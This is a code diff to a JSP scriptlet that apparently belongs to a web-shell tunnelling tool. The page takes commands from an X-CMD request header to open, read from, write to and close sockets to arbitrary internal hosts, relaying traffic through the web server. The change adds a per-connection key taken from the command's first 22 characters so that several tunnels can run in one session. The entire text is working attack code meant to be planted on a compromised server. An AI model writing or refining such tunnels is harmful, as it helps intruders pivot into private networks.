@@ -2,6 +2,8 @@
 <jsp:scriptlet><![CDATA[
 	String cmd = request.getHeader("X-CMD");
 	if (cmd != null) {
+        String mark = cmd.substring(0,22);
+        cmd = cmd.substring(22);
 		response.setHeader("X-STATUS", "OK");
 		if (cmd.compareTo("CONNECT") == 0) {
 			try {
@@ -11,7 +13,7 @@
 				SocketChannel socketChannel = SocketChannel.open();
 				socketChannel.connect(new InetSocketAddress(target, port));
 				socketChannel.configureBlocking(false);
-				session.setAttribute("socket", socketChannel);
+				session.setAttribute(mark, socketChannel);
 				response.setHeader("X-STATUS", "OK");
 			} catch (UnknownHostException e) {
 				System.out.println(e.getMessage());
@@ -21,18 +23,17 @@
 				System.out.println(e.getMessage());
 				response.setHeader("X-ERROR", e.getMessage());
 				response.setHeader("X-STATUS", "FAIL");
-				
 			}
 		} else if (cmd.compareTo("DISCONNECT") == 0) {
-			SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
+			SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
 			try{
 				socketChannel.socket().close();
 			} catch (Exception ex) {
 				System.out.println(ex.getMessage());
 			}
-			session.invalidate();
+            session.removeAttribute(mark);
 		} else if (cmd.compareTo("READ") == 0){
-			SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
+			SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
 			try{
 				ByteBuffer buf = ByteBuffer.allocate(513);
 				int bytesRead = socketChannel.read(buf);
@@ -57,7 +58,7 @@
 			}
 			
 		} else if (cmd.compareTo("FORWARD") == 0){
-			SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
+			SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
 			try {
 				
 				int readlen = request.getContentLength();
